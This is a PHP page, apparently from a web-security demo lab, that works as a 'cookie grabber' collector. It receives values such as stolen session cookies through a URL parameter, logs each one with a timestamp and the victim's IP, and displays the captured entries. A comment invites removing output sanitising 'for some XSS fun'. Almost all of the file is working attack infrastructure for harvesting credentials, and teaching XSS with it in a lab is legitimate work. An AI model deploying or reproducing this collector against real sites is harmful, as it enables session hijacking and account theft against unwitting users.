<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <script src="../assets/js/jquery.js"></script>
    <title>SQLi Demo 1</title>

    <link href="../assets/css/bootstrap.min.css" rel="stylesheet">
    <style type="text/css">
      body {
        padding-top: 40px;
        padding-bottom: 40px;
        background-color: #f5f5f5;
      }

      .form-signin {
        max-width: 600px;
        padding: 19px 29px 29px;
        margin: 0 auto 20px;
        background-color: #fff;
        border: 1px solid #e5e5e5;
        -webkit-border-radius: 5px;
           -moz-border-radius: 5px;
                border-radius: 5px;
        -webkit-box-shadow: 0 1px 2px rgba(0,0,0,.05);
           -moz-box-shadow: 0 1px 2px rgba(0,0,0,.05);
                box-shadow: 0 1px 2px rgba(0,0,0,.05);
      }
      .form-signin .form-signin-heading,
      .form-signin .checkbox {
        margin-bottom: 10px;
      }
      .form-signin input[type="text"],
      .form-signin input[type="password"] {
        font-size: 16px;
        height: auto;
        margin-bottom: 15px;
        padding: 7px 9px;
      }

    </style>
  </head>
  <body>
    <div class="container">
      <div class="form-signin">
        <h1>Cookie Grabber Results (<a href="?clear=clear">Clear</a>)</h1>
        <hr />
        <?php
            session_start();
            $id = session_id();

            if (!is_dir('logs'))
                mkdir('logs');

            $logfile = "logs/$id.txt";

            if (isset($_GET['val']))
            {
                // Add parameter to output file in format:
                // base64(value),timestamp,ip
                $value = base64_encode($_GET['val']);
                $timestamp = date("Y-m-d H:i:s", time());
                $ip = $_SERVER['REMOTE_ADDR'];
                $fh = fopen($logfile, 'a');
                fwrite($fh, "$value,$timestamp,$ip\n");
                fclose($fh);
            }
            else if (isset($_GET['clear']))
            {
                // Clear output file
                $fh = fopen($logfile, 'w');
                fclose($fh);
                header("Location: ./");
                exit;
            }
            else
            {
                // Attempt to load and display log file
                if (file_exists($logfile) && filesize($logfile) > 0)
                {
                    $fh = fopen($logfile, 'r');
                    $contents = trim(fread($fh, filesize($logfile)));    
                    fclose($fh);

                    print "<ul>\n";
                    $lines = explode("\n", $contents);
                    foreach ($lines as $line)
                    {
                        $data = explode(",", $line);
                        $data[0] = base64_decode($data[0]);
                        print "<li>Received on " . $data[1] . " from " . $data[2] . ":\n";
                        // Remove strip_tags for some XSS fun
                        print "<pre style='margin-top: 10px;'>" . strip_tags($data[0]) . "</pre></li>\n";
                    }
                    print "</ul>\n";
                }
                else
                {
                    print "<p class='lead'>No entries yet...</p>\n";
                }
            }
        ?>
      </div>

    </div> <!-- /container -->

  </body>
</html>